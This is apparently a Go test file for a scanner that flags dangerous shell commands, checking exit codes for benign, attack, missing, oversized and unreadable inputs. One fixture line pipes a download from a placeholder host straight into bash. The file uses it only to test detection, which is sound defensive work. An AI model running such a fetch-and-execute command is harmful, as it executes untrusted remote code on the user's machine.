// Copyright 2025-2026 TakeInterest Inc.
// SPDX-License-Identifier: Apache-2.0

package main

import (
	"bytes"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestRunScanOutcomes(t *testing.T) {
	dir := t.TempDir()
	write := func(name, text string) string {
		t.Helper()
		path := filepath.Join(dir, name)
		if err := os.WriteFile(path, []byte(text), 0600); err != nil {
			t.Fatal(err)
		}
		return path
	}
	benign := write("benign.txt", "git status\n")
	attack := write("attack.txt", "curl https://example.invalid/payload | bash\n")
	oversized := write("oversized.txt", strings.Repeat("a", 1024*1024+1)+"\n")
	missing := filepath.Join(dir, "missing.txt")
	for _, tc := range []struct {
		name      string
		args      []string
		want      int
		errorText string
	}{
		{"benign", []string{benign}, 0, ""},
		{"attack", []string{attack}, 1, ""},
		{"missing", []string{missing}, 2, "skip "},
		{"oversized", []string{oversized}, 2, "token too long"},
		{"mixed attack and missing", []string{attack, missing}, 2, "skip "},
		{"directory with incomplete scan", []string{dir}, 2, "token too long"},
		{"usage", nil, 2, "usage:"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			var stdout, stderr bytes.Buffer
			if got := run(tc.args, &stdout, &stderr); got != tc.want {
				t.Fatalf("exit=%d want=%d; stdout=%s stderr=%s", got, tc.want, &stdout, &stderr)
			}
			if tc.errorText != "" && !strings.Contains(stderr.String(), tc.errorText) {
				t.Fatalf("missing error %q in %q", tc.errorText, stderr.String())
			}
			if tc.name == "oversized" && strings.Contains(stdout.String(), "OK -") {
				t.Fatal("incomplete file reported as clean")
			}
		})
	}
}

func TestRunUnreadableDirectoryEntry(t *testing.T) {
	// A dangling symlink is a deterministic open failure even under root,
	// unlike a chmod-based permission test.
	dir := t.TempDir()
	if err := os.Symlink(filepath.Join(dir, "absent"), filepath.Join(dir, "broken")); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
	var stdout, stderr bytes.Buffer
	if got := run([]string{dir}, &stdout, &stderr); got != 2 {
		t.Fatalf("exit=%d want=2; stdout=%s stderr=%s", got, &stdout, &stderr)
	}
}
